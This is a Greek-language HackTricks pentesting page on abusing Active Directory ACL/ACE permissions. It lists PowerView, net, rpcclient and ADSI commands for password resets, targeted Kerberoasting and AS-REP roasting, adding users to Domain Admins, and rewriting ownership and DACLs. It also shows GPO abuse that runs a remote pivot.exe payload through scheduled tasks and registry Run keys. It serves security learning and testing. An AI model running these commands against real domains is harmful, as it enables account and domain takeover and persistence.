# Κατάχρηση ACLs/ACEs του Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ελέγξτε τα πρωτότυπα άρθρα.**

## BadSuccesor

{{#ref}}
BadSuccesor.md
{{#endref}}

## **GenericAll Δικαιώματα στον Χρήστη**

Αυτό το προνόμιο παρέχει σε έναν επιτιθέμενο πλήρη έλεγχο πάνω σε έναν λογαριασμό χρήστη-στόχο. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ένας επιτιθέμενος μπορεί να:

- **Αλλάξει τον Κωδικό Πρόσβασης του Στόχου**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό πρόσβασης του χρήστη.
- **Στοχευμένο Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη για να τον καταστήσει kerberoastable, στη συνέχεια χρησιμοποίησε το Rubeus και το targetedKerberoast.py για να εξάγεις και να προσπαθήσεις να σπάσεις τους κατακερματισμούς του εισιτηρίου χορήγησης εισιτηρίων (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Απενεργοποιήστε την προ-αυθεντικοποίηση για τον χρήστη, καθιστώντας τον λογαριασμό τους ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Δικαιώματα σε Ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να χειρίζεται τις συμμετοχές σε ομάδες εάν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως οι `Domain Admins`. Αφού προσδιορίσει το διακριτό όνομα της ομάδας με το `Get-NetGroup`, ο επιτιθέμενος μπορεί να:

- **Προσθέσει τον Εαυτό του στην Ομάδα Domain Admins**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας modules όπως το Active Directory ή το PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των δικαιωμάτων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Ενεργοποιεί την ανάληψη ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτή την τεχνική για να προσποιηθείτε έναν υπολογιστή ή λογαριασμό χρήστη εκμεταλλευόμενοι τα δικαιώματα για τη δημιουργία shadow credentials.

## **WriteProperty on Group**

Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για μια συγκεκριμένη ομάδα (π.χ., `Domain Admins`), μπορεί να:

- **Add Themselves to the Domain Admins Group**: Εφικτό μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την κλιμάκωση δικαιωμάτων εντός του τομέα.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Αυτή η προνόμια επιτρέπει στους επιτιθέμενους να προσθέτουν τους εαυτούς τους σε συγκεκριμένες ομάδες, όπως οι `Domain Admins`, μέσω εντολών που χειρίζονται άμεσα τη συμμετοχή στην ομάδα. Η χρήση της παρακάτω ακολουθίας εντολών επιτρέπει την αυτοπροσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ένα παρόμοιο προνόμιο, αυτό επιτρέπει στους επιτιθέμενους να προσθέτουν άμεσα τους εαυτούς τους σε ομάδες τροποποιώντας τις ιδιότητες της ομάδας εάν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτού του προνομίου πραγματοποιούνται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς να γνωρίζετε τον τρέχοντα κωδικό. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας αρκετές μεθόδους για την επαναφορά του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και one-liners για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, επιδεικνύοντας την ευελιξία των επιθέσεων.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner σε Ομάδα**

Αν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει την ιδιοκτησία της ομάδας σε τον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν η ομάδα που εξετάζεται είναι οι `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο πάνω σε χαρακτηριστικά και μέλη της ομάδας. Η διαδικασία περιλαμβάνει την αναγνώριση του σωστού αντικειμένου μέσω `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για να τροποποιήσει τον ιδιοκτήτη, είτε μέσω SID είτε μέσω ονόματος.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Αυτή η άδεια επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει τις ιδιότητες ενός χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του script σύνδεσης ενός χρήστη για να εκτελέσει ένα κακόβουλο script κατά την είσοδο του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερώσει την ιδιότητα `scriptpath` του στοχευόμενου χρήστη ώστε να δείχνει στο script του επιτιθέμενου.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να χειρίζονται τη συμμετοχή σε ομάδες, όπως το να προσθέτουν τους εαυτούς τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίων, τη χρήση του για την προσθήκη ή την αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών στη συμμετοχή με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και η ύπαρξη δικαιωμάτων `WriteDACL` σε αυτό επιτρέπει σε έναν επιτιθέμενο να παραχωρήσει στον εαυτό του δικαιώματα `GenericAll` πάνω στο αντικείμενο. Αυτό επιτυγχάνεται μέσω της χειρισμού ADSI, επιτρέποντας πλήρη έλεγχο πάνω στο αντικείμενο και τη δυνατότητα τροποποίησης των μελών της ομάδας του. Παρά ταύτα, υπάρχουν περιορισμοί όταν προσπαθεί κανείς να εκμεταλλευτεί αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Αναπαραγωγή στο Domain (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένες άδειες αναπαραγωγής στο domain για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί άδειες όπως `DS-Replication-Get-Changes`, επιτρέποντας στους επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε έναν Domain Controller. [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η ανατεθείσα πρόσβαση για τη διαχείριση των Αντικειμένων Πολιτικής Ομάδας (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, εάν ένας χρήστης όπως `offense\spotless` έχει ανατεθεί δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτές οι άδειες μπορούν να καταχραστούν για κακόβουλους σκοπούς, όπως προσδιορίζεται χρησιμοποιώντας το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Καταμέτρηση Αδειών GPO

Για να εντοπιστούν οι κακώς ρυθμισμένες GPO, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη GPO που έχει δικαιώματα διαχείρισης ένας συγκεκριμένος χρήστης: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Υπολογιστές με Εφαρμοσμένη Μια Δοθείσα Πολιτική**: Είναι δυνατόν να προσδιοριστούν οι υπολογιστές στους οποίους εφαρμόζεται μια συγκεκριμένη GPO, βοηθώντας στην κατανόηση της έκτασης της πιθανής επίδρασης. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Πολιτικές Εφαρμοσμένες σε Έναν Δοθέντα Υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**OUs με Εφαρμοσμένη Μια Δοθείσα Πολιτική**: Η αναγνώριση οργανωτικών μονάδων (OUs) που επηρεάζονται από μια δεδομένη πολιτική μπορεί να γίνει χρησιμοποιώντας `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για να καταμετρήσετε GPO και να βρείτε προβλήματα σε αυτά.

### Κατάχρηση GPO - New-GPOImmediateTask

Οι κακώς ρυθμισμένες GPO μπορούν να εκμεταλλευτούν για την εκτέλεση κώδικα, για παράδειγμα, δημιουργώντας μια άμεση προγραμματισμένη εργασία. Αυτό μπορεί να γίνει για να προστεθεί ένας χρήστης στην τοπική ομάδα διαχειριστών στους επηρεαζόμενους υπολογιστές, αυξάνοντας σημαντικά τα προνόμια:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το module GroupPolicy, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και σύνδεση νέων GPO, καθώς και την ρύθμιση προτιμήσεων όπως τιμές μητρώου για την εκτέλεση backdoors σε επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και έναν χρήστη να συνδεθεί στον υπολογιστή για εκτέλεση:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο για την κατάχρηση υπαρχόντων GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρχόντων GPOs ή τη χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Εξαναγκαστική Ενημέρωση Πολιτικής

Οι ενημερώσεις GPO συνήθως συμβαίνουν κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί η εντολή `gpupdate /force` στον στόχο υπολογιστή για να εξαναγκαστεί μια άμεση ενημέρωση πολιτικής. Αυτή η εντολή διασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Κάτω από την Επιφάνεια

Κατά την επιθεώρηση των Προγραμματισμένων Εργασιών για ένα συγκεκριμένο GPO, όπως η `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω σεναρίων ή εργαλείων γραμμής εντολών που στοχεύουν να τροποποιήσουν τη συμπεριφορά του συστήματος ή να κλιμακώσουν τα δικαιώματα.

Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των ενεργοποιητών της. Αυτό το αρχείο αντιπροσωπεύει τον τρόπο με τον οποίο οι προγραμματισμένες εργασίες ορίζονται και διαχειρίζονται εντός των GPO, παρέχοντας μια μέθοδο για την εκτέλεση αυθαίρετων εντολών ή σεναρίων ως μέρος της επιβολής πολιτικής.

### Χρήστες και Ομάδες

Τα GPO επιτρέπουν επίσης την παραποίηση των μελών χρηστών και ομάδων στα συστήματα στόχους. Με την επεξεργασία των αρχείων πολιτικής Χρηστών και Ομάδων απευθείας, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως η τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, που επιτρέπει την τροποποίηση των αρχείων πολιτικής για να περιλαμβάνουν νέους χρήστες ή να αλλάζουν τις συμμετοχές ομάδων.

Το αρχείο διαμόρφωσης XML για Χρήστες και Ομάδες περιγράφει πώς αυτές οι αλλαγές υλοποιούνται. Με την προσθήκη εγγραφών σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να αποκτήσουν ανυψωμένα δικαιώματα σε επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση στην κλιμάκωση δικαιωμάτων μέσω της παραποίησης GPO.

Επιπλέον, μπορούν να εξεταστούν πρόσθετες μέθοδοι για την εκτέλεση κώδικα ή τη διατήρηση της επιμονής, όπως η εκμετάλλευση σεναρίων σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών μητρώου για αυτόματες εκκινήσεις, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για τη διατήρηση πρόσβασης και τον έλεγχο των συστημάτων στόχων μέσω της κακοποίησης των GPO.

## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
